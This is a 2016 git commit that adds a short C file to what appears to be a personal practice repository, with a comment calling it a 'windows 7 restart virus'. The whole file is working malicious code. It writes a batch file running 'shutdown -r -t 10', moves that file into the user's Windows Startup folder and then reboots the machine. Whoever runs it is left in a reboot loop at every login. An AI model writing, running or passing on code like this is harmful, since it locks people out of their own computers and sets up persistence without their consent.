ce17a3c895a02c456dc8f7219fa66aafdf65928e
crisenchou <269298762@qq.com>
2016-09-13 15:13:37 +0800

    restart

---
+++ dailyPratice/C/practice/file.c
@@ -0,0 +1,13 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+//windows 7 restart virus
+int main()
+{
+    FILE *fp;
+    fp = fopen("start.bat", "w+");
+    fprintf(fp, "shutdown -r -t 10\n");
+    fclose(fp);
+    system("move start.bat \"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup\"");
+    system("shutdown -r -t 10\n");
+}
